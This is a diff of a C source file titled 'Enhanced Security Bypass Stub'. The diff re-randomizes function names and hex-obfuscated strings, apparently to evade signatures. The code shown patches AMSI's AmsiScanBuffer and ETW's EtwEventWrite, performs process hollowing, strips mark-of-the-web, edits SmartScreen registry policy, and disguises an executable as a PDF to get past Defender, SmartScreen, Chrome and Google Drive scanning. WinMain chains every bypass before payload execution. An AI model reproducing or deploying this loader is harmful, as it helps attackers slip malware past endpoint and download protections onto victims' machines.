@@ -1,5 +1,5 @@
 // Enhanced Security Bypass Stub
-// Generated: 1754501967786955242
+// Generated: 1754504307852589771
 
 #include <windows.h>
 #include <wininet.h>
@@ -24,11 +24,11 @@
 
 // Windows Defender Bypass Techniques
 
-BOOL amsi_wMwxDPZH() {
-    HMODULE h = LoadLibraryA("\x61msi\x2e\x64\x6cl");
+BOOL amsi_zZGyVCBD() {
+    HMODULE h = LoadLibraryA("am\x73i\x2ed\x6cl");
     if (!h) return TRUE;
     
-    void* addr = GetProcAddress(h, "\x41msiSc\x61n\x42\x75ff\x65\x72");
+    void* addr = GetProcAddress(h, "\x41m\x73iScanBuffer");
     if (!addr) return FALSE;
     
     DWORD old;
@@ -42,11 +42,11 @@ BOOL amsi_wMwxDPZH() {
     return TRUE;
 }
 
-BOOL etw_bLyhyiiM() {
-    HMODULE h = GetModuleHandleA("\x6et\x64\x6cl.dll");
+BOOL etw_bfEtCTsB() {
+    HMODULE h = GetModuleHandleA("ntd\x6c\x6c.\x64ll");
     if (!h) return FALSE;
     
-    void* addr = GetProcAddress(h, "Et\x77\x45ventWrit\x65");
+    void* addr = GetProcAddress(h, "EtwEvent\x57\x72i\x74\x65");
     if (!addr) return FALSE;
     
     DWORD old;
@@ -56,7 +56,7 @@ BOOL etw_bLyhyiiM() {
     return TRUE;
 }
 
-BOOL debug_odkzXGWB() {
+BOOL debug_gdjUidnE() {
     BOOL debuggerPresent = FALSE;
     CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
     
@@ -85,7 +85,7 @@ BOOL debug_odkzXGWB() {
 typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
 typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 
-BOOL hollow_zwEqThjM(LPSTR target, LPVOID payload, SIZE_T payloadSize) {
+BOOL hollow_xQjfaaJU(LPSTR target, LPVOID payload, SIZE_T payloadSize) {
     STARTUPINFOA si = {sizeof(si)};
     PROCESS_INFORMATION pi = {0};
     
@@ -117,7 +117,7 @@ BOOL hollow_zwEqThjM(LPSTR target, LPVOID payload, SIZE_T payloadSize) {
 
 // Chrome Safe Browsing Bypass
 
-BOOL motw_eoiidJUg(LPCSTR filename) {
+BOOL motw_uKzANQqv(LPCSTR filename) {
     // Remove Zone.Identifier ADS
     char adsPath[MAX_PATH];
     snprintf(adsPath, sizeof(adsPath), "%s:Zone.Identifier", filename);
@@ -129,17 +129,17 @@ BOOL motw_eoiidJUg(LPCSTR filename) {
     return TRUE;
 }
 
-const char* headers_jOgLYggc[] = {
-    "C\x6fnte\x6et-\x54y\x70e:\x20\x61\x70\x70l\x69\x63\x61ti\x6fn/\x70\x64f",
-    "\x43\x6f\x6etent\x2dDi\x73\x70o\x73i\x74ion\x3a\x20i\x6el\x69n\x65;\x20\x66ilename="\x64ocu\x6de\x6et\x2epdf"",
-    "\x58\x2d\x43\x6fnte\x6et\x2d\x54\x79\x70e-\x4f\x70\x74ions: no\x73ni\x66f",
-    "\x58-Do\x77nl\x6fad-Op\x74i\x6fns: \x6eo\x6f\x70e\x6e",
-    "Cache-\x43o\x6etr\x6fl:\x20\x6e\x6f-ca\x63he,\x20\x6e\x6f-\x73tore, \x6d\x75\x73t-revalidat\x65",
-    "\x50\x72a\x67\x6da\x3a n\x6f\x2d\x63ac\x68e",
-    "Expires\x3a\x200"
+const char* headers_cDgRhXSJ[] = {
+    "Con\x74e\x6e\x74\x2d\x54\x79pe: ap\x70lication/p\x64\x66",
+    "\x43\x6f\x6ete\x6et\x2dD\x69spos\x69t\x69\x6fn: inlin\x65; f\x69lenam\x65=\x22\x64\x6fc\x75\x6dent\x2e\x70d\x66"",
+    "X-\x43o\x6ete\x6et-Ty\x70\x65\x2d\x4f\x70\x74i\x6fns\x3a n\x6fs\x6e\x69ff",
+    "X-\x44\x6f\x77nload-Opti\x6fn\x73: \x6e\x6fo\x70en",
+    "\x43ac\x68e\x2d\x43on\x74r\x6f\x6c: n\x6f-ca\x63\x68\x65, \x6e\x6f-stor\x65,\x20\x6du\x73\x74-reval\x69\x64ate",
+    "\x50rag\x6da\x3a no-cach\x65",
+    "Expire\x73: 0"
 };
 
-BOOL disguise_bVXReqqX(LPCSTR exePath, LPCSTR outputPath) {
+BOOL disguise_uMiFsDER(LPCSTR exePath, LPCSTR outputPath) {
     // Read exe
     HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return FALSE;
@@ -165,7 +165,7 @@ BOOL disguise_bVXReqqX(LPCSTR exePath, LPCSTR outputPath) {
 
 // SmartScreen Bypass Techniques
 
-BOOL smartreg_rzWvEmgX() {
+BOOL smartreg_mhDDrFNw() {
     HKEY hKey;
     LPCWSTR paths[] = {
         L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments",
@@ -187,7 +187,7 @@ BOOL smartreg_rzWvEmgX() {
     return TRUE;
 }
 
-BOOL comhij_ceHlqIwq() {
+BOOL comhij_tcPJrjWi() {
     // Disable SmartScreen via COM
     CoInitialize(NULL);
     
@@ -209,7 +209,7 @@ BOOL comhij_ceHlqIwq() {
 
 // Google Drive Security Bypass
 
-BOOL mime_dFNLvJNv(LPCSTR filename) {
+BOOL mime_kSXJKkVL(LPCSTR filename) {
     // Create companion files to confuse scanning
     char txtFile[MAX_PATH], docFile[MAX_PATH];
     snprintf(txtFile, sizeof(txtFile), "%s.txt", filename);
@@ -238,7 +238,7 @@ BOOL mime_dFNLvJNv(LPCSTR filename) {
     return TRUE;
 }
 
-BOOL archive_wNiahWXc(LPCSTR exePath, LPCSTR zipPath) {
+BOOL archive_fZSHhGDw(LPCSTR exePath, LPCSTR zipPath) {
     // Create a zip with specific structure to bypass scanning
     // Using Windows Shell COM for zip creation
     CoInitialize(NULL);
@@ -297,13 +297,13 @@ BOOL archive_wNiahWXc(LPCSTR exePath, LPCSTR zipPath) {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    amsi_wMwxDPZH(); // AMSI bypass
-    etw_bLyhyiiM(); // ETW bypass
-    debug_odkzXGWB(); // Debugger assistance
-    motw_eoiidJUg(lpCmdLine); // Remove MOTW
-    smartreg_rzWvEmgX(); // SmartScreen registry
-    comhij_ceHlqIwq(); // COM hijacking
-    mime_dFNLvJNv(lpCmdLine); // MIME manipulation
+    amsi_zZGyVCBD(); // AMSI bypass
+    etw_bfEtCTsB(); // ETW bypass
+    debug_gdjUidnE(); // Debugger assistance
+    motw_uKzANQqv(lpCmdLine); // Remove MOTW
+    smartreg_mhDDrFNw(); // SmartScreen registry
+    comhij_tcPJrjWi(); // COM hijacking
+    mime_kSXJKkVL(lpCmdLine); // MIME manipulation
     
     // Execute payload
     MessageBoxA(NULL, "All bypasses applied successfully!", "Success", MB_OK);
